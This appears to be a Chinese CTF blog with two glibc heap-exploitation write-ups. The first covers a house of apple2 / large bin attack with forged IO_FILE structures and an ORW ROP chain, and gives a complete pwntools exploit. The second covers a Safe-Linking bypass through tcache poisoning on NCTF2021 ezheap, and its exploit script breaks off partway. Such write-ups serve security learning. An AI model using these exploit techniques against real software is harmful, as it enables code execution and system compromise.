<h6 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h6><p>用上文提到的补充中的方法，先申请一个大的堆块，然后进入 <code>large bin</code> 中，然后篡改其 <code>bk_nextsize</code> 为 <code>target_addr-0x20</code> （此时用了唯一一次写的机会），还需要去写其他数据，这里后面再说，篡改完 <code>bk_nextsize</code> 后，再让一个略小的堆块进入 <code>large bin</code> 即可触发 <code>large bin attack</code> ，此时 <code>IO_list_all</code> 就为略小的堆块地址，但问题是我们只能控制大堆块中的数据，参考了 <strong>winmt</strong> 师傅的做法，再申请与小堆块等大的堆块就会从 <code>large bin</code> 中取出来小堆块，这样就会触发 <code>unlink</code> ，代码如下</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022258433.png" alt="image-20230202225821151" style="zoom:50%;" />

<p>此时这几个指针为</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022259382.png" alt="image-20230202225959295"></p>
<p>这个 <code>p-&gt;bk_nextsize</code> 是  <code>IO_list_all-0x20</code> 的地址，而触发 <code>p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize</code> 就将大堆块的地址写入了 <code>IO_list_all-0x20+0x20</code> 的位置，所以只要再申请一个和小堆块等大的堆块，触发这个 <code>unlink</code> 就可以将大堆块的地址写入 <code>IO_list_all</code> 中了（<strong>roderick</strong> 师傅和<strong>winmt</strong> 师傅都太强了）</p>
<h6 id="伪造结构体-amp-amp-布局"><a href="#伪造结构体-amp-amp-布局" class="headerlink" title="伪造结构体&amp;&amp;布局"></a>伪造结构体&amp;&amp;布局</h6><p>控制了链表头指针，就意味着接下来就可以开始伪造 <code>IO_FILE</code> 了，因为这个 <code>IO_FILE</code> 的前几个字段都无法改变（因为是堆块的 <code>prev_size</code> <code>size</code> <code>fd</code> <code>bk</code> <code>fd_nextsize</code> <code>bk_nextsize</code> 字段），这会干扰我们伪造 <code>IO_FILE</code> 的字段（比如 <code>_flags</code> 字段这里我们不可控），因此我们这个结构体只控制 <code>IO_write_base</code> 和 <code>_chain</code> 字段，我专门把 <code>IO_write_base</code> 改成 <code>IO_list_all</code> 是因为这个字段需要大于 <code>IO_write_ptr</code> 字段，才不会触发 <code>overflow</code> ，然后通过 <code>_chain</code> 遍历到下个结构体的时候去开始真正利用。（此时伪造的第一个结构体如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022310901.png" alt="image-20230202231015667" style="zoom:50%;" />



<p>接下来就要开始伪造触发 <code>overflow</code> 的这个 <code>IO_FILE</code> 结构体了，条件按照上面 <code>house of apple2</code> 中总结的伪造即可，这里伪造字段没啥可说的，只能对着 <code>gdb</code> 一点一点把偏移调出来，然后布局好，因为还要再布置一个 <code>wide_data</code> 结构体，所以调试起来要花费点时间。慢慢的按照每个条件的要求控制每个字段即可，下面直接给出最后伪造出来的结构体。</p>
<p>这是触发 <code>overflow</code> 的第二个伪造的 <code>IO_FILE</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022316010.png" alt="image-20230202231655803" style="zoom:50%;" />



<p>下面这个是伪造的 <code>_IO_wide_data</code> 结构体，因为堆块很大，所以放心布置即可</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022318082.png" alt="image-20230202231820885" style="zoom:50%;" />

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022318642.png" alt="image-20230202231830333"></p>
<p>如果要获取 <code>shell</code> 的话，那控制 <code>IO_FILE</code> 的 <code>_flags</code> 字段为参数， <code>_wide_vtable</code> 中的 <code>overflow</code> 改成 <code>system</code> 地址即可获取  <code>shell</code>。</p>
<h6 id="栈迁移-amp-amp-rop"><a href="#栈迁移-amp-amp-rop" class="headerlink" title="栈迁移&amp;&amp;rop"></a>栈迁移&amp;&amp;rop</h6><p>但是打 <code>orw</code> 的话要略微麻烦一点，我这里是采用了 <code>winmt</code> 师傅提到的一个 <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272098.htm">方法</a>，利用下面这段 <code>gadget</code> 打了一个栈迁移，因为 <code>rdi+0x48</code> 可控（<code>rdi</code> 就是 <code>IO_FILE</code> 的首地址），所以 <code>rbp</code> 可控，所以 <code>rax</code> 可控，所以 <code> call   QWORD PTR [rax+0x28]</code> 可以控制程序的执行流，这里的执行流去调用 <code>leave ; ret</code> 进行一个栈迁移</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svcudp_reply+26&gt;:    mov    rbp,QWORD PTR [rdi+0x48]</span><br><span class="line">&lt;svcudp_reply+30&gt;:    mov    rax,QWORD PTR [rbp+0x18]</span><br><span class="line">&lt;svcudp_reply+34&gt;:    lea    r13,[rbp+0x10]</span><br><span class="line">&lt;svcudp_reply+38&gt;:    mov    DWORD PTR [rbp+0x10],0x0</span><br><span class="line">&lt;svcudp_reply+45&gt;:    mov    rdi,r13</span><br><span class="line">&lt;svcudp_reply+48&gt;:    call   QWORD PTR [rax+0x28]</span><br></pre></td></tr></table></figure>

<p>下面是正在执行这段 <code>gadget</code> 的情况</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022329670.png" alt="image-20230202232950364" style="zoom:50%;" />

<p>下图为栈迁移后的情况，接下来触发 <code>rop</code> 链</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022330494.png" alt="image-20230202233043116" style="zoom:50%;" />



<p>最后 <code>orw</code> 的 <code>rop</code> 链如下，此时将要开始执行</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022332120.png" alt="image-20230202233224913" style="zoom:50%;" />



<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">d_a=<span class="number">0x13B9</span></span><br><span class="line">d_d=<span class="number">0x13C3</span></span><br><span class="line">d_r=<span class="number">0x13E0</span></span><br><span class="line">d_w=<span class="number">0x13FD</span> </span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">choice</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choise: &quot;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: \n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_data</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Message: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_data</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">p.sendlineafter(<span class="string">&quot;enter your key &gt;&gt;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">write_data(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Message: \n&quot;</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219ce0</span></span><br><span class="line">p.recv(<span class="number">2</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x13c0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">_IO_wfile_jumps=libc_base+<span class="number">0x2160c0</span></span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret=libc_base+<span class="number">0x00000000000562ec</span></span><br><span class="line">magic_gadget=libc_base+<span class="number">0x16a1fa</span></span><br><span class="line">pop_rsp_ret=<span class="number">0x0000000000035732</span>+libc_base</span><br><span class="line">pop_rdi_ret=libc_base+<span class="number">0x000000000002a3e5</span></span><br><span class="line">add_rsp_ret=<span class="number">0x000000000003a889</span>+libc_base</span><br><span class="line">pop_rsi_ret=libc_base+<span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_r12_ret=libc_base+<span class="number">0x000000000011f497</span></span><br><span class="line">open_addr=libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr=libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr=libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rax_ret=libc_base+<span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall=libc_base+<span class="number">0xea5b9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#open</span></span><br><span class="line">rop=p64(pop_rdi_ret)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0x518</span>)<span class="comment"># &#x27;flag&#x27; address</span></span><br><span class="line">rop+=p64(pop_rsi_ret)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(pop_rax_ret)</span><br><span class="line">rop+=p64(<span class="number">2</span>)</span><br><span class="line">rop+=p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">rop+=p64(pop_rdi_ret)</span><br><span class="line">rop+=p64(<span class="number">3</span>)</span><br><span class="line">rop+=p64(pop_rsi_ret)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0xb40</span>)<span class="comment"># flag store address</span></span><br><span class="line">rop+=p64(pop_rdx_r12_ret)</span><br><span class="line">rop+=p64(<span class="number">0x50</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(read_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">rop+=p64(pop_rdi_ret)</span><br><span class="line">rop+=p64(<span class="number">1</span>)</span><br><span class="line">rop+=p64(pop_rsi_ret)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0xb40</span>)<span class="comment"># flag store address</span></span><br><span class="line">rop+=p64(pop_rdx_r12_ret)</span><br><span class="line">rop+=p64(<span class="number">0x50</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(write_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wide_data=p64(<span class="number">0</span>)*<span class="number">21</span></span><br><span class="line">wide_data+=p64(leave_ret)<span class="comment">#second call</span></span><br><span class="line">wide_data+=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">wide_data+=<span class="string">b&quot;./flag\x00\x00&quot;</span></span><br><span class="line">wide_data+=p64(add_rsp_ret)<span class="comment">#第二次栈迁移  原因是rop链不能破坏下面的magic_gadget</span></span><br><span class="line">wide_data+=p64(<span class="number">0</span>)</span><br><span class="line">wide_data+=p64(heap_base+<span class="number">0x450</span>-<span class="number">0x68</span>+(<span class="number">8</span>*<span class="number">29</span>))</span><br><span class="line">wide_data+=p64(magic_gadget)<span class="comment">#first call</span></span><br><span class="line">wide_data+=rop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io_file=p64(~(<span class="number">2</span> | <span class="number">0x8</span> | <span class="number">0x800</span>)+(<span class="number">1</span>&lt;&lt;<span class="number">64</span>))<span class="comment">#_flags</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)<span class="comment">#write_base &amp;&amp; write_ptr</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">io_file+=p64(heap_base+<span class="number">0x538</span>-<span class="number">0x20</span>)<span class="comment">#rbp  [rdi+0x48]</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">io_file+=p64(heap_base+<span class="number">0x450</span>)<span class="comment">#wide_data</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">io_file+=p64(_IO_wfile_jumps)</span><br><span class="line"></span><br><span class="line">payload=p64(libc_base+<span class="number">0x21a1f0</span>)*<span class="number">2</span>+p64(io_list_all)+p64(io_list_all-<span class="number">0x20</span>)<span class="comment">#io_write_base控制为io_list_all 因为需要大于io_write_ptr不触发overflow</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(heap_base+<span class="number">0x370</span>)<span class="comment">#chain    指向了第一个伪造的结构体的vtable</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">14</span></span><br><span class="line">payload+=io_file</span><br><span class="line">payload+=wide_data</span><br><span class="line"></span><br><span class="line">read_data(<span class="number">0</span>,payload.ljust(<span class="number">0x880</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_d,d_w,d_r,<span class="number">0x12BC</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022334166.png" alt="image-20230202233408774"></p>
<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>首先感谢 <strong>roderick</strong> 师傅分享这种攻击方法，<code>house of apple2</code> 所需的条件较少，是一种很优秀的攻击方法。</p>
<p>在学习的过程中，尽量多翻看源码，捋清函数的执行流，清楚需要绕过的检查以及所伪造的字段。在实际的题目中，需要经常使用 <code>gdb</code> 调试来边调边布局结构体中的数据，自己进入调试那种状态很美妙，似乎只有自己知道自己在做什么，通过调试来预测以及验证接下来程序的变化是很享受的一件事情（尽管重复的敲击那几个按键，手会比较酸 -&gt;.-&gt; ），这种东西只可意会不可言传。</p>
<p>多动手，多思考就会离真相更近一步。</p>
<h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273418.htm">https://bbs.kanxue.com/thread-273418.htm</a></p>
<p><a target="_blank" rel="noopener" href="https://www.roderickchan.cn/post/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">House of Apple 一种新的glibc中IO攻击方法 (2) - roderick - record and learn! (roderickchan.cn)</a></p>
<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272098.htm">https://bbs.kanxue.com/thread-272098.htm</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/501cca6.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/501cca6.html" class="post-title-link" itemprop="url">Safe-Linking 机制的绕过</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-05-15 07:36:47" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-06-17 11:53:21" itemprop="dateModified" datetime="2023-06-17T11:53:21+08:00">2023-06-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>自从引入了 <code>tcache</code> 机制后，从 <code>2.26</code> 开始 <code>tcache poisoning</code> 就是一种简便的攻击方式，因为它不需要像 <code>fastbin attack</code> 利用那样对 <code>size</code> 检查较为严格，只能申请到 <code>malloc</code> 和 <code>_IO_2_1_stdout_</code> 上方的区域。篡改了 <code>tcache bin</code> 中堆块的 <code>next</code> 指针就相当于可以任意地址申请了 </p>
<h3 id="safe-Linking"><a href="#safe-Linking" class="headerlink" title="safe-Linking"></a>safe-Linking</h3><p>在 <code>2.32</code> 之前 <code>tcache poisoning</code> 可以说是无往不利，但到了 <code>glibc 2.32</code> 及以后，增加了 <code>safe-Linking</code> 机制。 <code>safe-Linking</code> 就是对 <code>next</code> 指针进行了一些运算</p>
<p>规则是将 <strong>当前 <code>free</code> 后进入 <code>tcache bin</code> 堆块的用户地址</strong> 右移 <code>12</code> 位的值和 <strong>当前 <code>free</code> 后进入 <code>tcache bin</code> 堆块原本正常的 <code>next</code> 值</strong> 进行<strong>异或</strong> ，然后将这个值重新写回 <code>next</code> 的位置</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">#define PROTECT_PTR(pos, ptr) \</span><br><span class="line">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br></pre></td></tr></table></figure>



<p>触发这个 <code>PROTECT_PTR</code> 宏，有两种情况，第一种是当前 <code>free</code> 的堆块是第一个进入 <code>tcache bin</code> 的（此前 <code>tcache bin</code> 中没有堆块），这种情况原本 <code>next</code> 的值就是 <code>0</code> ，第二种情况则是原本的 <code>next</code> 值已经有数据了。<strong>如果是第一种情况的话，对于 <code>safe-Linking</code> 机制而言，可能并没有起到预期的作用，因为将当前堆地址右移 <code>12</code> 位和 <code>0</code> 异或，其实值没有改变，如果我们能泄露出这个运算后的结果，再将其左移 <code>12</code> 位就可以反推出来堆地址，如果有了堆地址之后，那我们依然可以篡改 <code>next</code> 指针，达到任意地址申请的效果</strong> </p>
<p>恢复 <code>next</code> 的宏为 <code>#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</code> ，其实这个宏最终还是调用了 <code>PROTECT_PTR</code> ，原理就是 <code>A=B^C ; C=A^B</code> </p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="NCTF2021-ezheap"><a href="#NCTF2021-ezheap" class="headerlink" title="NCTF2021-ezheap"></a>NCTF2021-ezheap</h4><p>[题目链接](<a target="_blank" rel="noopener" href="https://github.com/X1cT34m/NCTF2021/tree/main/Pwn/ezheap">NCTF2021&#x2F;Pwn&#x2F;ezheap at main · X1cT34m&#x2F;NCTF2021 (github.com)</a>)</p>
<p>本题的 <code>libc</code> 版本为 <code>2.32</code>，因为是本地复现，所以我就随便选了一个 <code>2.32</code> 的小版本来做了</p>
<h5 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h5><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191044578.png" alt="image-20230319104415444" style="zoom:67%;" />

<h5 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h5><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191044228.png" alt="image-20230319104447181" style="zoom:50%;" />

<p>在 <code>delete</code> 函数中，发现 <code>free</code> 掉 <code>malloc_store[index]</code> 后将 <code>size_store[index]</code> 给置空了，由于忘记给 <code>malloc_store[index]</code> 造成了 <code>UAF</code> 。</p>
<p>因为本题有 <code>edit</code> 和 <code>show</code> 函数，所以篡改 <code>next</code> 以及泄露堆地址和 <code>libc</code> 地址都较为轻松</p>
<h5 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h5><h6 id="edit-after-free"><a href="#edit-after-free" class="headerlink" title="edit-after-free"></a>edit-after-free</h6><p>考虑一点就是 <code>delete</code> 函数后会将 <code>size[index]</code> 置空，如果直接 <code>edit</code> 的话，无法往里面写入数据。采取的措施是 先申请 <code>chunk1</code> 然后将其释放，此时它的 <code>size</code> 被置空了，但是地址依然留在了 <code>malloc_store</code> 里面，此时再申请等大的 <code>chunk2</code>，此时再次释放 <code>chunk1</code> （因为刚刚的 <code>chunk2</code> 是将原本的 <code>chunk1</code> 申请出来了，所以这里不会造成 <code>double free</code>），此时 <code>chunk1</code> 和 <code>chunk2</code> 指向的地址是相同的，<code>chunk1</code> 的 <code>size</code> 为 <code>0</code>， <code>chunk2</code> 的 <code>size</code> 正常，并且编辑 <code>chunk2</code> 就可以篡改已经处于 <code>free</code> 状态的 <code>chunk1</code>，从而修改其 <code>next</code> 指针。（如下图）</p>
<p>通过下图可以发现，此时 <code>0x000055d5f6e622a0</code> 的位置是有两个，第二个对应的 <code>size</code> 是 <code>0x70</code>，所以可以在这里篡改 <code>next</code> 指针</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191104276.png" alt="image-20230319110417830" style="zoom: 67%;" />



<h6 id="泄露堆地址"><a href="#泄露堆地址" class="headerlink" title="泄露堆地址"></a>泄露堆地址</h6><p>此时的 <code>tcache bin</code> 中只有一个堆块，执行 <code>show</code> 函数泄露其 <code>next</code> 指针数据，得到了 <code>0x551dcbb2</code> ，我们将其左移 <code>12</code> 位即可得到堆地址（因为 <code>next</code> 原本为 <code>0</code>，和 <code>0</code> 异或结果不变）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191109678.png" alt="image-20230319110941492" style="zoom:50%;" />

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span></span><br></pre></td></tr></table></figure>

<p>此时即可得到堆地址（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191113663.png" alt="image-20230319111330505" style="zoom:50%;" />



<h6 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h6><p>最后一点需要考虑的是如何将 <code>__free_hook</code> 写入到 <code>next</code> 指针上。</p>
<p>因为 <code>safe_Linking</code> 机制会存放 <code>next</code> 指针运算后的结果，因此 <code>tcache poisoning</code> 只需要我们自己将 <code>__free_hook</code> 地址进行同样方法运算写入 <code>next</code> 位置（如下）</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">value=((heap_base+<span class="number">0x2a0</span>)&gt;&gt;<span class="number">12</span>)^free_hook</span><br></pre></td></tr></table></figure>

<p><code>heap_base+0x2a0</code> 是当前 <code>free</code> 后进入 <code>tcache bin</code> 堆块的用户地址</p>
<p>此时 <code>__free_hook</code> 写入 <code>next</code> 后的情况如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191154909.png" alt="image-20230319115455792"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191155547.png" alt="image-20230319115549446"></p>
<p>最后将 <code>__free_hook</code> 申请出来写入 <code>system</code> 地址，通过 <code>free</code> 释放掉一个存有 <code>/bin/sh</code> 字符串的堆块，获取 <code>shell</code>。</p>
<p><strong>注意：</strong> 需要提前布局 <code>0x80</code> 这条链的堆块，保证其 <code>counts</code> 在申请 <code>__free_hook</code> 时要大于 <code>0</code>，否则无法从这条 <code>tcache bin</code> 中申请出来 <code>__free_hook</code></p>
<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">p,e,libc=load(<span class="string">&quot;ezheap&quot;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#leak heap_address</span></span><br><span class="line"></span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;preven chunk&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">11</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span 